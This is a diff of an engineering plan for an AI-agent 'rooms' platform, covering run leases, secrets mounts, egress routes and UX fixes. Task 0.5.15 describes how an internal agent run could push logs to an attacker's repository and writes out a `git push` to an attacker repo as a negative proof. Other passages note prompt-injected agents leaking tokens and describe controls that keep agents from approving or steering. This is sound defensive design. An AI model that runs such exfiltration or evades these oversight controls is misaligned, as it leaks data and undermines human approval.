@@ -219,9 +219,9 @@ what it costs if it is wrong. None edits the spec; the ones worth promoting into
 | P12 | "the `rooms-proxy` client is written under that path" | `zitadel-oidc-clients.sh` gains a `rooms-proxy` consumer that issues **JWT** access tokens and writes `{client-id, client-secret, cookie-secret}` to **OpenBao** `agents/rooms-proxy` (the `agents` mount, P38) through the root-token session the aws-0 sync already opens | That script runs on every deploy (`opentofu/aws/eks/init/workflows.tm.hcl`) and OpenBao restores the path. Every other consumer goes to AWS Secrets Manager, which C1 forbids to `agent-system` | The first sync after a ZITADEL restore from a seed lacking the app rotates the client; the script already handles that |
 | P13 | Room MCP: "Injected credential plus `x-ar-agent`"; fallback: bridge relay | The MCPRoute backend injects a generated key in header `x-room-mcp-key` (`securityPolicy.apiKey`). **The relay fallback is not built** | SP1 confirmed from source that `x-ar-agent` reaches MCP backends (SP1 §6). A key in a custom header keeps `Authorization` out of every MCP hop (gate A6's intent) | If Task 3.11 finds no `x-ar-agent`, ruling P36 applies: the relay is not built in this plan |
 | P14 | Before SP3, "the broker shows the `AgentRun` for the owner to create" (fork) | The same holds for **hand to role** and **add agent**. The broker renders the claim; the owner runs it. `task agent:run` gains `--room <id>` | C3: only the factory creates runs, and it does not exist yet. The broker's RBAC never includes `create` | The owner is in the loop for every run until SP3; the factory client (`POST /v1/runs`) is built and unit-tested, and switches on with `factoryURL` |
-| P15 | `state_changed{run_phase}` | When a run ends, the broker appends `state_changed{kind: run_phase, phase, reason}` with reason `agent_finished`, `agent_error`, `agent_stuck`, `deadline`, `pod_lost`, `revoked`, `deleted` (the claim was deleted first, review M15) or `budget-*`. It derives the reason from the harness's last status in the log and the run's timings | UX finding H3: every failure reads `Failed/PodFailed`. The log is the only place that knows whether the agent ended its conversation | A pod lost within 30 s of its deadline reads `deadline` |
+| P15 | `state_changed{run_phase}` | When a run ends, the broker appends `state_changed{kind: run_phase, phase, reason}` with reason `agent_finished`, `agent_error`, `agent_stuck`, `deadline`, `pod_lost`, `room_busy` (P17 refused the run, which never started: F15), `revoked`, `deleted` (the claim was deleted first, review M15) or `budget-*`. It derives the reason from the harness's last status in the log, the run's timings and any `room_busy` refusal | UX finding H3: every failure reads `Failed/PodFailed`. The log is the only place that knows whether the agent ended its conversation | A pod lost within 30 s of its deadline reads `deadline` |
 | P16 | "the Room CRD schema in the validation catalog" | The CRD is **vendored** into `infrastructure/base/room-broker/crd-rooms.yaml` from the agent-platform stack tip's `config/crd/agents.ogenki.io_rooms.yaml` (Phase 7: the release asset `crd-rooms.yaml`), and `gen-catalog.sh` extracts it from there | The CRD must be applied by Flux anyway; a vendored copy is the single source for both | A CRD bump is a copy in the pin commit |
-| P17 | "One Running run per room" | Enforced at **bridge hello** through a lease on the room's row (`rooms.bridge_run`, `rooms.bridge_seen_at`), which every replica shares: a second run's bridge gets `409 room_busy` while the holder is live and was seen within 2 min, and the broker appends `state_changed{kind: limit, reason: concurrent_run}`. Each batch the holder pushes renews the lease | The broker cannot refuse to create a run (it creates none), but no run joins a room without it. An in-memory check would hold on one replica only (review I7) | The second run still spends tokens until someone deletes it. A holder that dies without ending its run blocks the room for up to 2 min |
+| P17 | "One Running run per room" | Enforced at **bridge hello** through a lease on the room's row (`rooms.bridge_run`, `rooms.bridge_seen_at`), which every replica shares. A second run's bridge gets `409 room_busy` for as long as the holder's run is live, however long since its bridge was seen, and the broker appends `state_changed{kind: limit, reason: concurrent_run}`. **A takeover happens only once the holder's run is not live** (ruling SBB): time alone never frees the lease. **A run starts only with the lease** (F15): the composition's `room-gate` init container holds the harness until the bridge holds it. A room still busy after 3 min fails the pod before the harness runs, and the run ends `room_busy` (P15) | The broker cannot refuse to create a run (it creates none), but no run executes in a room without the lease. An in-memory check would hold on one replica only (review I7). Freshness-based takeover let two runs execute after a broker outage longer than 2 min (F15 review, I1) | A refused run is never retried by the platform: start it again once the holder ends. A holder whose pod hangs blocks the room until its run ends (a lost pod ends it `PodLost` at once, F12; a hung one at its deadline) |
 | P18 | §8: "Claude Code is never an approving or steering client" | The broker refuses `decide`, `message{steering}`, `interrupt` and `driver_*` from tokens whose `azp` is the `roomctl` client. Only a web UI session can do those | `roomctl` holds a human's token on a laptop where a local agent can run it | Approving from a terminal is impossible; the phone UI covers the travel case |
 | P19 | PR body links `Agent-Room: https://rooms.${private_domain_name}/r/<id>` | **Superseded by P32** (Δ4 accepted 2026-09-27): the harness writes `Agent-Room: <roomId>` in the footer, and the rules no longer ask the agent to | — | — |
 | P20 | Payload ≤ 64 KiB | An oversize payload is stored as `{"oversize": true, "bytes": N, "type": …}` rather than refused | A refused harness event would block the bridge's cursor forever | The oversize content is lost (it is still in the pod until it ends) |
@@ -243,8 +243,9 @@ what it costs if it is wrong. None edits the spec; the ones worth promoting into
 | P36 | Spec §3 fallback: "the bridge relays these calls over its authenticated socket" (C5, unverified) | **The relay is not built.** Room tools rely on `agent-router` projecting `x-ar-agent` to MCP backends, which SP1 confirmed from source (P13). Task 3.11 Step 1 proves it live before anything depends on it | A relay needs a loopback MCP server in the bridge, a harness MCP configuration pointing at it (an image and a composition change) and an `mcp` SSE frame: a phase of its own | If Step 1 finds no `x-ar-agent`, phase 3 stops there. Agents cannot record handoffs or verdicts, and SC-4 and SC-14 wait for a follow-up plan that builds the relay. Phases 4–6 use no room tool (P1) and continue |
 | P37 | External reviews, 2026-09-27: SP1's gaps M2–M4, M6–M9, N3, N8 and B2 | **One PR, H-1 (`fix/agent-review-hardening`), stacked on SP1's `feat/agent-e2e` (#2111); S1 and H-S3 stack on H-1** instead of #2111 and #2110. H-1 carries M4's redaction in the harness source and bumps it to `v0.1.1`; the image that runs it is H-S3's `v0.2.0` | S3's MCPRoute edits then sit on H-1's trimmed tool lists without a conflict, and `v0.2.0` ships M4 with the footer. H-1 pins no crossplane-configuration release of SP2's, so Phase 7 stays acyclic: #2111 → H-1 → H-S3 → CC release → S1. The bump keeps H-1's merge from republishing SP1's `v0.1.0` tag | M4 is not live before phase 3's harness pre-release: until then an injected agent can print its ≤ 1 h, one-repository token into VictoriaLogs (T3) |
 | P38 | Review M1: SP1 S9 put the agents' secrets under `platform/agents/*`, and `external-secrets` reads all of `platform/` through `openbao-platform`, a ClusterSecretStore with no `conditions`, so any namespace allowed to create an `ExternalSecret` can read the agents' App key | **A kv-v2 mount of their own, `agents`**, named only by `agents-secrets` and `secrets-admin`, created with `merge-gate` (SP3 R44) in Task 1.15a, before this plan writes a new secret. [OWNER] moves `github-app`, `zai` and `factory-app` (`bao kv get` → `bao kv put -mount=agents`) and deletes the old keys once every ExternalSecret is Ready. The raft snapshot carries every mount, so a rebuild restores it with no seed. Until S1 merges in Phase 7, `aws/openbao/management` is deployed only from an `integration/agent-factory` checkout | A mount is a boundary no prefix grant elsewhere can widen: `external-secrets.hcl` grants `platform/data/*`. The review's other option, a `namespaceSelector` on `openbao-platform`, would still let every namespace it admits read the App keys | **A deploy of the management stack from `main` before S1 merges destroys both mounts and every key in them**; its preview shows `2 to destroy` first, and the recovery is a raft restore of the last snapshot. During the migration the ExternalSecrets cannot refresh for a few minutes (their Secrets are `Retain`) |
-| P39 | Reviews M2, M3: an `internal` run reads VictoriaMetrics' operator introspection, and, as an implementer, any ConfigMap, ServiceAccount or node in the cluster (`get_kubernetes_resources` over a cluster-wide ClusterRole) | H-1 removes `tsdb_status`, `active_queries` and `top_queries` from every role and `get_kubernetes_resources` from the implementer, and trims the ClusterRole of `configmaps`, `serviceaccounts`, `nodes` and `pods/log` (the first and last stay readable in `flux-system`). **No `internal` run gets a model route (SP4 PR 2) before H-1's live gate passes on `integration/agent-factory`**, and SP4 PR 2 merges after H-1 in the programme's wave | Today no `internal` run can call a model, so this surface has no reader yet; SP4 PR 2 creates one, and its output reaches pull requests on a public repository | Reviewer, tester and triager keep VictoriaLogs `query`, `hits` and `facets` over every namespace: `security`'s and other runs' log lines stay readable by an internal run. A tenant or a per-run filter is backlog |
+| P39 | Reviews M2, M3: an `internal` run reads VictoriaMetrics' operator introspection, and, as an implementer, any ConfigMap, ServiceAccount or node in the cluster (`get_kubernetes_resources` over a cluster-wide ClusterRole) | H-1 removes `tsdb_status`, `active_queries` and `top_queries` from every role and `get_kubernetes_resources` from the implementer, and trims the ClusterRole of `configmaps`, `serviceaccounts`, `nodes` and `pods/log` (the first and last stay readable in `flux-system`). **No `internal` run gets a model route (SP4 PR 2) before H-1's live gate passes on `integration/agent-factory`**, and not before R04's internal egress (no direct GitHub or profile egress, the read-only route; Task 0.5.15) passes its proof *(external review R04)*. SP4 PR 2 merges after H-1 in the programme's wave | Today no `internal` run can call a model, so this surface has no reader yet; SP4 PR 2 creates one, and its output reaches pull requests on a public repository | Reviewer, tester and triager keep VictoriaLogs `query`, `hits` and `facets` over every namespace: `security`'s and other runs' log lines stay readable by an internal run. A tenant or a per-run filter is backlog |
 | P40 | Review B2: `validate-manifests.sh` cannot run on a pre-release crossplane-configuration pin, because `gen-catalog.sh` fetches `releases/download/<ver>/xrd-crds.yaml`, which only a release publishes | **CC-H1: the pre-release job also pushes `xrd-crds.yaml` as the OCI artifact `ghcr.io/smana/crossplane-configuration-xrd-crds:<version>`**, and this repo's CI puts it in `XRD_CRDS_FILE` through `scripts/ci/fetch-xrd-crds.sh` when the pin is a pre-release. CC-S1 stacks on CC-H1, so every later CC pre-release carries it | An OCI artifact, not a GitHub pre-release asset: a pre-release creates a `v*` tag, and the pre-release job derives the next version from the newest `v*` tag. `gen-catalog.sh` keeps its single seam, the variable it already reads | One more ghcr package the owner makes public once. CC-2's own `v0.7.2-pr29.3ad168a` has no artifact, so H-1 pins CC-H1's pre-release (the same XRDs) |
+| P41 | External review R16 (2026-10-02): `atlasSchema.ref` follows the moving branch `feat/room-driver` (ruling ST, amended 2026-10-01), so a push to it migrates an unchanged deployment within ~10 min, and branch deletion 404s the source | **A frozen pin branch `pin/room-broker-<sha8>`**, cut at the commit of the pinned broker image and protected by an agent-platform ruleset (no update, no deletion on `pin/**`). A re-pin cuts a new pin branch at the new image's commit and moves image, retention CronJob, `crd-rooms.yaml` and `atlasSchema.ref` together. Applied at the next integration re-pin (`pin/room-broker-5bd18d02` at the F10/F11 live re-verify). The wave still pins the release tag (Phase 7). Still never a SHA | The composition maps a non-`v` ref to a GitRepository `branch`; a frozen branch cannot move or be deleted. A pre-release tag would fire agent-platform's release workflow, and a broker schema-hash check detects only after Atlas migrated | One `git push` and one ruleset for the owner. Optional guard: a doc-claims-style check that the `<sha8>` in `atlasSchema.ref` equals the room-broker image tag's |
 
 ## Interfaces with other sub-projects
 
@@ -460,6 +461,7 @@ tags and merges it.
 | [OWNER] | 3.6 | Only if the session's gh token lacks `write:packages`: push H-S3's harness pre-release (four commands, given in the task) |
 | [OWNER] | 2.14 | Grant `agents-admin` to yourself and `agents-member` to each developer: `scripts/provision/zitadel-oidc-clients.sh sync --cluster aws-0 --cloud aws --grant agents-admin=<email> --grant agents-member=<email> --apply` (each user must have logged in once) |
 | [OWNER] | 7.1 | Sign off the whole programme's UX (ruling P33). Nothing merges before it |
+| [OWNER] | before the first `internal` run | Re-confirm `agents-member` watches everywhere (spec §1, D1) for `internal` rooms before the first internal run, or ask for a follow-up gating `Read`/`Fork` on `dataClass` (external review R12) |
 | [OWNER] | 7.2–7.6 | The merge wave: turn off auto-delete, retarget and merge each PR (a ruleset bypass here), push each release tag, delete the branches last |
 
 One GitHub App: SP3's factory App, created early (Task 3.9), so the owner creates one App for both
@@ -1716,6 +1718,39 @@ Expected: `yes`, `yes`, `no`. Step 1's run reached `Succeeded`; `kubectl delete 
 then leaves `kubectl get sandbox -n agents` without it within 2 minutes.
 
 - [ ] **Step 6: H-1 out of draft** for review. It stays open until Phase 7 (P33).
+
+### Task 0.5.15: R04 — `internal` runs get no direct GitHub or profile egress (CC-H2, gateway route)
+
+External review R04 (2026-10-02): the composition opens `github` for every run whatever its
+`dataClass`, and an FQDN rule cannot see whose credentials a request carries, so an `internal` run
+could push cluster logs to an attacker's repository with a presented token (SP1 T4/T5; `npm publish`
+is the same class). An in-pod proxy cannot close it (a CNP is per pod). The gateway the run already
+reaches can. Not part of H-1 as shipped: its own crossplane-configuration PR (**CC-H2**) and a route
+on the gateway that serves the `internal` listener. If the agentgateway migration lands first, its
+plan builds the route there, once (review R14). CC-H2 joins Task 7.4's crossplane-configuration release.
+
+**Files:**
+- Modify (crossplane-configuration): `apis/agentrun/kcl/main.k` (`_profiles`, run env, credential
+  helper), `apis/agentrun/kcl/main_test.k`, the AgentRun XRD (CEL rule)
+- Create: the `github-read` route and its egress rule beside the agent router's `internal` listener
+
+- [ ] **Step 1: Composition (CC-H2).** `_profiles = [] if dataClass == "internal" else ["github"] + …`.
+  Internal runs get `GIT_CONFIG_*` env `url.http://<router>:8081/github/.insteadOf=https://github.com/`,
+  mint no GitHub token (no credential helper) and run a no-op `preStop`. XRD CEL:
+  `self.dataClass != 'internal' || !has(self.egress) || size(self.egress.profiles) == 0`.
+  Tests next to the existing CNP cases: the internal CNP has no `toFQDNs`; a profile on an internal
+  run is rejected.
+- [ ] **Step 2: Route.** HTTPRoute `github-read` on the `internal` listener only, prefix `/github/`,
+  backends `github.com:443` and `codeload.github.com:443` with TLS origination. Match `GET`/`HEAD` on
+  any path, plus `POST` on `^/github/[^/]+/[^/]+(\.git)?/git-upload-pack$`; everything else `403`.
+  A request header modifier removes `Authorization`. The gateway's egress CNP gains the two FQDNs.
+- [ ] **Step 3: [LIVE] Proof, from an `internal` tester sandbox.**
+  `git push https://x:<foreign PAT>@github.com/<attacker>/r` fails (name not resolvable); `git push`
+  through the route gets `403`; `curl -H 'Authorization: token <PAT>' …/github/…` goes out anonymous;
+  `git clone` and `git fetch origin pull/N/head` through the route work. This proof is P39's gate.
+
+Risk if wrong: anonymous reads suit public repositories only; a private target repository needs a
+token on that route, decided then.
 
 ---
 
@@ -7840,7 +7875,8 @@ three without delegating authorisation to a pre-1.0 protocol or a runtime we rej
 ### Neutral
 
 - Next re-check of ax and Substrate: 2026-12-15, or when EKS ships 1.37 and Substrate closes #1898,
-  lifts its no-spot rule (#1528) and fixes #1657.
+  lifts its no-spot rule (#1528) and fixes #1657. #1898 closed on 2026-10-02, unreleased
+  ([2026-10-04 re-check](../specs/2026-10-01-agent-ecosystem-recheck-research.md#2026-10-04-re-check-ax-and-substrate-claims-against-code)).
 
 ---
 
@@ -9156,15 +9192,18 @@ kubectl wait -n agents "agentrun/$RUN4" --for=jsonpath='{.status.phase}'=Failed 
 $PSQL "SELECT run_id, payload->>'reason' FROM events WHERE room_id = '$ROOM' AND payload->>'kind' = 'run_phase' AND payload->>'phase' <> 'Running' ORDER BY seq"
 ```
 
-Expected: `RUN3`'s run id with `deadline`, and `RUN4`'s with `pod_lost`. Both runs' AgentRuns read
-`Failed PodFailed`.
+Expected: `RUN3`'s run id with `deadline`, and `RUN4`'s with `pod_lost`. `RUN3`'s AgentRun reads
+`Failed PodFailed`, and `RUN4`'s reads `Failed PodLost` (F12). `RUN4`'s replacement pod stays
+`SchedulingGated` (`agents.ogenki.io/pod-lost`) and is never scheduled, so the task does not run twice.
 
 - [ ] **Step 7: One live run per room** (ruling P17)
 
 Start two runs in a fresh room one after the other without waiting, then:
 `$PSQL "SELECT payload FROM events WHERE room_id = '<room>' AND payload->>'kind' = 'limit'"`.
 Expected: one `{"kind":"limit","reason":"concurrent_run",…}` row, and the second run's bridge
-logging `room_busy`. Delete both runs. The broker has one replica here; Task 2.14 Step 4b proves the
+logging `room_busy`. The second run's pod waits in `Init` with no `harness` container, then about
+3 min later goes `Init:Error`. Its room log ends `run_phase Failed reason room_busy`, and `agent/<room>`
+holds only the first run's commits (F15). The broker has one replica here; Task 2.14 Step 4b proves the
 lease across two (review I7).
 
 - [ ] **Step 8: The system API, as the factory will call it**
@@ -12072,6 +12111,10 @@ Expected: one of two outcomes, and the next step depends on which.
 
 - [ ] **Step 3: Record the outcome** in the PR's evidence section, with the seed name.
 
+- [ ] **Step 4: State the recovery objectives** *(external review R08)*. RPO: events since the last
+  promoted seed. RTO: one rebuild plus the CNPG restore. Both are stated on the status page; the
+  per-failure table is in the spec's §4 "Recovery objectives".
+
 ### Task 2.13: Pins, gates, PR S2
 
 - [ ] **Step 1:** Repeat Task 1.21 Steps 1–2 with AP-2's pre-release and branch `feat/room-viewers`
@@ -12127,7 +12170,7 @@ Expected: both pages show `reconnecting`, then `live` again within seconds. Thei
 
 With both broker replicas Ready, start two runs in a fresh room, one right after the other, as in
 Task 1.22 Step 7. Expected: the same single `limit`/`concurrent_run` row, whichever replica each
-bridge's `hello` reached. `kubectl logs -n agent-system -l app.kubernetes.io/name=room-broker --prefix | grep room_busy`
+bridge's `hello` reached. `kubectl logs -n agent-system -l app.kubernetes.io/name=room-broker --prefix | grep 'room busy'`
 names the replica that refused it. Delete both runs.
 
 - [ ] **Step 5: SC-9, the run side**
@@ -16661,8 +16704,10 @@ Expected: `20261001120000`.
 
 - [ ] **Step 2: SC-3**
 
-The owner creates a room from the UI ("new room", public), then invites the developer as a
-collaborator from the UI's owner menu (the `invite` action). The developer sends "steer now: use
+The owner creates a room from the UI ("new room", public), then adds the developer to
+`spec.members` as collaborator (`kubectl edit room`; there is no invite UI before Phase 7, ledger
+D10), and the developer reloads the page; once Task 7.0 B3 ships, no reload is needed *(external
+review R10)*. The developer sends "steer now: use
 the v2 API". Expected: footer `rejected: not_permitted`. The owner gives the token to the developer
 ("give…", `human:<developer sub>`). Expected: a `driver` event with `epoch` one higher, and the
 developer's page shows the steer controls. The developer steers again. Expected: accepted.
@@ -18721,6 +18766,7 @@ Gate: SC-13 on `main`, and `integration/agent-factory` reconciling on release ta
 
 ```mermaid
 flowchart LR
+  FIX["7.0 UX fixes A1–C3"] --> UX
   UX["7.1 [OWNER] UX sign-off"] --> AP["7.2 agent-platform: AP-0…AP-6, one release"]
   UX --> H1["7.2a H-1 after SP1 #2111: harness v0.1.1; then O-1"]
   H1 --> H["7.3 H-S3 after H-1: harness v0.2.0"]
@@ -18730,11 +18776,38 @@ flowchart LR
   S --> DEL["7.6 integration on tags, then delete branches"]
 ```
 
+### Task 7.0: UX fixes the sign-off would re-find (external reviews R09–R11)
+
+On AP-5's branch (`feat/room-approvals`), all in `web/` plus one guide line; no broker or schema
+change. Each item lands test-first. **Task 7.1 does not start until A1–C3 are checked.**
+
+| Item | File | Change | Test |
+|---|---|---|---|
+| **A1** (R09) | `web/src/controls.ts` | Option labels "post to the room (no agent is prompted)", "queue for the next run's brief", "steer the running agent now". Chat stays the default: queued text enters an LLM prompt. On token loss with steering selected, `delivery.value = ""` (a disabled placeholder "choose where this goes"); send refuses an empty delivery; `say("You no longer hold the driver token: choose where this message goes.")`. Reverses 4.5 review I3 / mutant B's expected value | `controls.test.ts`: `toBe("none")` becomes `toBe("")`; send emits no frame and the notice is set |
+| **A2** (R09) | `web/src/render.ts` | A `message` row shows a badge `chat \| queued \| steering → <to>`; a `state_changed{delivered}` row names `#<ref>` | `render.test.ts`: one row per delivery value |
+| **A3** (R09) | `website/content/docs/platform/ai-platform/agents/user-guide.md` §4 | The default is the room, not the next run (done on `main` with the review's amendment PR) | — |
+| **B1** (R10) | `web/src/room-state.ts`, `main.ts` | `RoomState.phase`, set by `reset` and `state_changed{room_phase}`; the header renders it | `room-state.test.ts` |
+| **B2** (R10) | `web/src/render.ts` | A `handoff` case, `handoff <fromRole> → <toRole> @ <commit[:7]>` + `markdown(summary)` (untrusted, T10); short text for `driver` (`from → to · reason`) and `participant` (`principal · change · role`) | No `pre.raw` for these three types |
+| **B3** (R10) | `web/src/main.ts` | A `participant` event naming you closes the socket; the reconnect's state frame re-resolves `you`. No client projection; the broker re-resolves standing on every act | FakeSocket sees a close after that event |
+| **B4** (R10) | `web/src/controls.ts` | `refresh()` never calls `root.replaceChildren`: sections mount once and toggle `hidden`; `renderDriver` keeps `giveTo`/`takeReason` attached | Focus a field, `refresh()` twice, `document.activeElement` unchanged (fails today) |
+| **B5** (R10) | `controls.ts`, `view.ts`, `main.ts` | `aria-label` on every `select`/`input`/`textarea`; `role="status" aria-live="polite"` on the footer notice | A scan test: every form control has an accessible name |
+| **C1** (R11) | `web/src/view.ts` `newRoomForm` | A disabled, selected placeholder "choose a data class", `required`, and a hint: immutable, governs model route, tools and egress, does not change who can read the room (R12). Never default to `public` | `view.test.ts`: submit without a choice sends no POST |
+| **C2** (R11) | `web/src/conn.ts`, `main.ts` | `onRefused` returns whether to retry; when `/api/rooms` lacks the id, `conn.stop()` (no further `setTimeout`) and "No such room, or you cannot read it" with a link to `/`. Same answer for both cases: no existence oracle | `conn.test.ts`: refused + `stop()` → no reconnect |
+| **C3** (R11) | `web/src/controls.ts` | `expiresAt.toLocaleString()` when the date is not today | One case |
+
+- [ ] **Step 1:** A1–C3 test-first, `task check` green on AP-5, pre-release re-pinned on integration.
+
 ### Task 7.1: [OWNER] UX sign-off
 
 - [ ] **Step 1:** The owner reviews the whole programme's UX on aws-0: the rooms UI, `roomctl`, the
   verdict comment and PR footer, approvals, fork. Record their written sign-off here, as a comment
   on a tracking issue (#2092, the design PR, merged on 2026-09-27 by the owner's decision). **Nothing below starts before it.**
+  The owner decides each of these, accept or defer, not pre-built *(external reviews R10, R11)*:
+  a summary panel (`snap.runs`, PR, outcome, needs-you); older-history paging; an identity picker
+  for give; controls placement; keyboard-only use; the approval card's initiator and prompter,
+  "Allow action" wording plus the S9 "oversight, never widens" line, and a countdown; D10's
+  invite/close UI; and "a first-time member creates a public room and recovers from a mistyped room
+  URL unaided".
 - [ ] **Step 2:** [OWNER] turns off "Automatically delete head branches" on `Smana/agent-platform`,
   `Smana/crossplane-configuration` and this repo for the wave. A deleted branch 404s every Git
   source still tracking it, `atlasSchema.ref` first. Task 7.6 deletes the branches, once nothing
